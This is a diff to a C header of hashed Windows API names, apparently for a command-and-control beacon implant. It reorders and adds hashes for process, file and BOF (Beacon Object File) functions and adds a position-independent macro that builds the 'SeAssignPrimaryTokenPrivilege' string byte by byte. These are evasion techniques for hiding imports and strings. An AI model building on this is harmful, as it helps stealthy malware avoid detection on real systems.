@@ -53,7 +53,7 @@
 #define H_NTCLOSE              0x1498D8A5u   /* NtClose */
 #define H_NTQUERYSYSTEMINFORMATION 0x37072D8Au  /* NtQuerySystemInformation */
 #define H_NTQUERYVIRTUALMEMORY     0x315E365Fu  /* NtQueryVirtualMemory */
-#define H_NTOPENPROCESS        0x3ED17B38u  /* NtOpenProcess */
+#define H_NTOPENPROCESS            0x3ED17B38u  /* NtOpenProcess */
 #define H_NTTERMINATEPROCESS       0xB931F2E7u  /* NtTerminateProcess */
 #define H_NTSETINFORMATIONPROCESS  0x81BADCAAu  /* NtSetInformationProcess */
 
@@ -78,6 +78,7 @@
 #define H_MOVEFILEEXA          0x59632232u  /* MoveFileExA */
 #define H_CLOSEHANDLE          0x00FEF545u  /* CloseHandle */
 #define H_REMOVEDIRECTORYA     0x192454D3u  /* RemoveDirectoryA */
+#define H_SETFILEATTRIBUTESA   0x016537C7u  /* SetFileAttributesA */
 #define H_FINDFIRSTFILEA       0xBDC52C95u  /* FindFirstFileA */
 #define H_FINDNEXTFILEA        0x533ED8F8u  /* FindNextFileA  */
 #define H_FINDCLOSE            0x3FF09C86u  /* FindClose      */
@@ -174,7 +175,6 @@
 #define H_GETFILESIZE                0x7C072ED8u  /* GetFileSize */
 #define H_GETLASTERROR               0x84BD9597u  /* GetLastError */
 #define H_GETPROCESSMITIGATIONPOLICY 0x7BC86641u  /* GetProcessMitigationPolicy */
-#define H_SETFILEATTRIBUTESA         0x016537C7u  /* SetFileAttributesA */
 
 /* kernelbase.dll */
 #define H_KERNELBASE_DLL             0x91624877u
@@ -325,16 +325,16 @@
 /* Async BOF APIs */
 #define H_BOF_BEACONWAKEUP                   0xde6f5ab4u
 #define H_BOF_BEACONGETSTOPJOBEVENT          0x6e7db176u
-/* BOF key-value store */
-#define H_BOF_BEACONADDVALUE         0x636D6BD1u  /* BeaconAddValue            */
-#define H_BOF_BEACONGETVALUE         0x64630FB8u  /* BeaconGetValue            */
-#define H_BOF_BEACONREMOVEVALUE      0x41B9FB76u  /* BeaconRemoveValue         */
-#define H_BOF_GETPROCESSHEAP         0x36C75DF2u  /* GetProcessHeap            */
 /* BOF proxy functions - bare LoadLibraryA/GetProcAddress/etc. (no MODULE$ prefix) */
 #define H_BOF_LOADLIBRARYA           0xE96CE9EFu  /* LoadLibraryA              */
 #define H_BOF_GETPROCADDRESS         0x12D71805u  /* GetProcAddress            */
 #define H_BOF_GETMODULEHANDLEA       0xA2AE8F7Cu  /* GetModuleHandleA          */
 #define H_BOF_FREELIBRARY            0x9CE6498Eu  /* FreeLibrary               */
+/* KV store + heap redirect */
+#define H_BOF_BEACONADDVALUE         0x636D6BD1u  /* BeaconAddValue            */
+#define H_BOF_BEACONGETVALUE         0x64630FB8u  /* BeaconGetValue            */
+#define H_BOF_BEACONREMOVEVALUE      0x41B9FB76u  /* BeaconRemoveValue         */
+#define H_BOF_BEACONGETPROCESSHEAP   0xD726DD36u  /* BeaconGetProcessHeap      */
 
 /* ===== beacon private heap management ===== */
 #define H_HEAPCREATE   0xF6BF1E07u  /* HeapCreate  */
@@ -366,3 +366,11 @@
 #define H_WSAEVENTSELECT                 0xB709ABEEu
 #define H_WSARESETEVENT                  0x024F6B57u
 #define H_WSAENUMNETWORKEVENTS           0x4B2730B6u
+
+/* ========= [ PIC string macros ] ========= */
+
+#define NAX_SE_ASSIGN_PRIMARY_TOKEN_WRITE(p) \
+    (p)[ 0]='S'; (p)[ 1]='e'; (p)[ 2]='A'; (p)[ 3]='s'; (p)[ 4]='s'; (p)[ 5]='i'; (p)[ 6]='g'; (p)[ 7]='n'; \
+    (p)[ 8]='P'; (p)[ 9]='r'; (p)[10]='i'; (p)[11]='m'; (p)[12]='a'; (p)[13]='r'; (p)[14]='y'; (p)[15]='T'; \
+    (p)[16]='o'; (p)[17]='k'; (p)[18]='e'; (p)[19]='n'; (p)[20]='P'; (p)[21]='r'; (p)[22]='i'; (p)[23]='v'; \
+    (p)[24]='i'; (p)[25]='l'; (p)[26]='e'; (p)[27]='g'; (p)[28]='e'; (p)[29]='\0'
